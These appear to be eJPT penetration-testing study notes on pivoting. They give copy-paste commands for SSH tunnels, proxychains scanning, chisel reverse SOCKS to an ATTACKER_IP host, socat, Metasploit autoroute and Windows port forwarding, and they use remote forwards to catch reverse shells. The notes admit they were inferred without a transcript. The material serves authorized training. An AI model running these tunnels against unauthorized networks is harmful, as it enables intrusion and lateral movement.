# 01 - Pivoting (eJPT) — Study Notes

Note: No transcript was provided. The following is an informed, conservative summary based on the filename “01 - Pivoting.mp4” in folder “01-PivotingOverview” and standard eJPT pivoting practices. Replace placeholders (ALL_CAPS) with your lab-specific values.

## What the video covers (Introduction / big picture)
- What pivoting is: using a compromised/breachable “pivot” host to reach otherwise inaccessible internal networks.
- When to pivot: target behind NAT, firewall, or segmented VLAN; services only reachable from an internal host.
- Types of tunnels:
  - Local port forwarding (ssh -L): focus on a single internal service.
  - Remote port forwarding (ssh -R): expose your local listener to the pivot environment (catch shells, etc.).
  - Dynamic SOCKS proxy (ssh -D / chisel socks): route multiple tools/ports via a single proxy.
- Typical workflow: compromise/breach -> enumerate interfaces/routes -> choose tunnel method -> scan via proxy -> target internal services -> maintain/clean up.
- Tools and approaches: SSH/ProxyJump, proxychains, Nmap via SOCKS (TCP connect scans), chisel/socat, plink/netsh on Windows, Metasploit autoroute + socks_proxy, sshuttle for transparent routing.

## Flow (ordered)
1. Gain initial access to a pivotable host (or valid SSH creds).
2. Enumerate network details on the pivot:
   - Interfaces, routes, and neighboring subnets.
3. Verify internal reachability from the pivot (test a known internal IP/port).
4. Choose a pivot method:
   - Dynamic SOCKS (flexible multi-host scanning).
   - Local forward to a specific service (RDP/DB/SMB).
   - Remote forward to catch shells or expose your local tools inside.
   - Metasploit autoroute + socks_proxy (if using Meterpreter).
   - chisel/socat if SSH is not available.
5. Stand up the tunnel and verify with a single connection (curl/ncat).
6. Configure your tooling to use the proxy/tunnel (proxychains/Nmap).
7. Enumerate and exploit internal targets.
8. Maintain stability (autossh/keepalives), log key findings (subnets/services).
9. Clean up tunnels and artifacts.

## Tools highlighted
- SSH client: ssh, autossh, sshuttle, ProxyJump (-J), -L/-R/-D
- Proxy/transport: proxychains4, chisel, socat
- Scanning/validation: nmap, curl, ncat/nc
- Windows pivot helpers: plink.exe (PuTTY), netsh interface portproxy
- Metasploit: meterpreter autoroute, auxiliary/server/socks_proxy
- Enumeration on pivot: ip/ifconfig/route/arp (Linux), ipconfig/route/arp (Windows)

## Typical command walkthrough (detailed, copy-paste friendly)

Replace:
- PIVOT_USER, PIVOT_IP = credentials/host you can reach
- INTERNAL_SUBNET = e.g., 10.10.2.0/24
- INTERNAL_HOST = e.g., 10.10.2.25
- ATTACKER_IP = your Kali IP
- LOCAL_SOCKS_PORT = 1080

1) Enumerate from the pivot (Linux)
```
ip a
ip r
arp -an
netstat -rn
```

2) Enumerate from the pivot (Windows)
```
ipconfig /all
route print
arp -a
```

3) SSH Dynamic SOCKS (most common)
- Create a SOCKS5 proxy on your attacker box via the pivot:
```
ssh -N -f -D 1080 PIVOT_USER@PIVOT_IP \
  -o ExitOnForwardFailure=yes \
  -o ServerAliveInterval=30
```
- Configure proxychains (Kali):
```
sudo sed -i 's/^#*socks5 .*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
# Or add at the end if not present:
# socks5 127.0.0.1 1080
```
- Verify the proxy works to an internal host:
```
proxychains -q curl -sI http://INTERNAL_HOST:80 || proxychains -q ncat --proxy 127.0.0.1:1080 --proxy-type socks5 INTERNAL_HOST 445
```

4) Scan internal network via SOCKS (Nmap over TCP connect)
- Use -sT (not -sS), skip host discovery (-Pn), avoid DNS (-n), tune timeouts:
```
proxychains -q nmap -sT -Pn -n -vv --max-retries 2 --host-timeout 20s -T4 \
  -p 80,139,445,3389 INTERNAL_SUBNET
```
- Deep enum on a single host:
```
proxychains -q nmap -sT -Pn -n -sV -sC -T4 -p- INTERNAL_HOST
```
Note: UDP scans and raw-packet features (SYN scan, OS detection) don’t work reliably through SOCKS.

5) SSH Local port forward (focus on one service)
- Forward local port 3389 to INTERNAL_HOST:3389 via the pivot:
```
ssh -N -f -L 3389:INTERNAL_HOST:3389 PIVOT_USER@PIVOT_IP -o ExitOnForwardFailure=yes
# Then connect locally:
xfreerdp /v:127.0.0.1 /u:USER /p:PASS
# or
rdesktop 127.0.0.1
```

6) SSH Remote port forward (expose your local listener to the pivot side)
- Useful to catch reverse shells from internal hosts:
```
ssh -N -f -R 0.0.0.0:4444:127.0.0.1:4444 PIVOT_USER@PIVOT_IP -o ExitOnForwardFailure=yes
# Now a shell on INTERNAL_HOST can connect to PIVOT_IP:4444 and reach your local listener.
```

7) SSH ProxyJump (simple hop for SSH access to internal hosts)
```
ssh -J PIVOT_USER@PIVOT_IP USER@INTERNAL_HOST
scp -o ProxyJump=PIVOT_USER@PIVOT_IP file USER@INTERNAL_HOST:/tmp/
```

8) Chisel reverse SOCKS (when only outbound from pivot is allowed)
- On attacker:
```
chisel server --reverse -p 8000
```
- On pivot (upload chisel and run):
```
./chisel client ATTACKER_IP:8000 R:1080:socks
```
- Now you have a SOCKS5 proxy on attacker 127.0.0.1:1080:
```
proxychains -q nmap -sT -Pn -n -p 445 INTERNAL_SUBNET
```

9) Socat simple TCP forward (if SSH not available)
- Forward pivot:8443 to INTERNAL_HOST:443 (run on pivot):
```
socat TCP-LISTEN:8443,fork,reuseaddr TCP:INTERNAL_HOST:443
```
- From attacker, connect to PIVOT_IP:8443 to reach INTERNAL_HOST:443.

10) Metasploit autoroute + SOCKS proxy (if using Meterpreter)
- In meterpreter:
```
run post/multi/manage/autoroute
# or manual:
route add INTERNAL_SUBNET 255.255.255.0
```
- Start SOCKS proxy in msfconsole:
```
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
```
- Then:
```
proxychains -q nmap -sT -Pn -n -p 445 INTERNAL_SUBNET
```

11) sshuttle (layer-3 transparent routing via SSH)
- Good for broad TCP/ICMP-like reachability without proxychains:
```
sudo sshuttle -r PIVOT_USER@PIVOT_IP INTERNAL_SUBNET -x ATTACKER_IP --dns
```
Note: Requires Python on pivot; may be blocked by strict firewalling.

12) Windows pivot with plink.exe (SOCKS and forwards)
- Dynamic SOCKS from Windows pivot to your Kali (run on Kali if you can reach pivot via SSH):
  - If you have credentials to pivot SSH, same as Linux ssh -D.
- If pivot is Windows and you can run plink from it (to your Kali):
```
plink.exe -ssh -N -D 1080 ATTACKER_USER@ATTACKER_IP
```
- Local forward (Windows pivot -> internal):
```
plink.exe -ssh -N -L 3389:INTERNAL_HOST:3389 ATTACKER_USER@ATTACKER_IP
```

13) Windows netsh portproxy (L4 forward on Windows)
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectaddress=INTERNAL_HOST connectport=443
# Verify
netsh interface portproxy show all
```

14) Keep tunnels stable and quiet
- autossh:
```
autossh -M 0 -N -f -D 1080 PIVOT_USER@PIVOT_IP -o ServerAliveInterval=30 -o ServerAliveCountMax=3
```
- SSH keepalives:
```
-o ServerAliveInterval=30 -o ServerAliveCountMax=3 -o ExitOnForwardFailure=yes
```

## Practical tips
- Prefer -sT over -sS when scanning via SOCKS; raw packet scans don’t traverse proxies.
- Use -Pn and -n with Nmap behind proxies to avoid slow host discovery and DNS leaks.
- Tune timeouts: --max-retries, --host-timeout, -T4 to keep scans manageable.
- Verify one host/port through the tunnel before scanning a /24.
- Dynamic SOCKS is flexible; use local forward when you know the exact service (e.g., RDP/DB).
- For reverse shells from internal hosts, set up ssh -R on the pivot or use Metasploit bind/reverse carefully.
- chisel is lightweight and great when SSH isn’t available or you need reverse-only egress.
- Log discovered subnets from ip r/route print; these guide your target scope.
- Clean up: kill ssh/chisel/socat processes, remove portproxy rules, revert proxychains config.
- Always have authorization. Pivoting is powerful and noisy if misconfigured.

## Minimal cheat sheet (one-screen flow)
- Enumerate:
```
ip a; ip r; arp -an   # Linux
ipconfig /all & route print & arp -a   # Windows
```
- Dynamic SOCKS via SSH:
```
ssh -N -f -D 1080 PIVOT_USER@PIVOT_IP -o ExitOnForwardFailure=yes -o ServerAliveInterval=30
echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains4.conf
proxychains -q curl -I http://INTERNAL_HOST:80
```
- Scan through SOCKS:
```
proxychains -q nmap -sT -Pn -n -T4 --max-retries 2 -p 80,139,445,3389 INTERNAL_SUBNET
```
- Local forward to a service:
```
ssh -N -f -L 3389:INTERNAL_HOST:3389 PIVOT_USER@PIVOT_IP
rdesktop 127.0.0.1
```
- chisel reverse SOCKS:
```
chisel server --reverse -p 8000
./chisel client ATTACKER_IP:8000 R:1080:socks
```
- Metasploit route + SOCKS:
```
run post/multi/manage/autoroute
use auxiliary/server/socks_proxy; set SRVHOST 127.0.0.1; set SRVPORT 1080; run
```

## Summary
This overview covered the why and how of pivoting in eJPT labs: identify internal subnets from a reachable or compromised pivot, choose an appropriate tunneling method (SSH -D/-L/-R, chisel, socat, Metasploit autoroute + socks_proxy), verify with a simple connection, then scan and access internal services using proxy-aware tools (proxychains + Nmap with -sT/-Pn). Use local forwards for targeted services (RDP/DB), remote forwards to receive shells, and dynamic SOCKS for flexible multi-host enumeration. Keep tunnels stable, tune scan performance, and clean up after the engagement.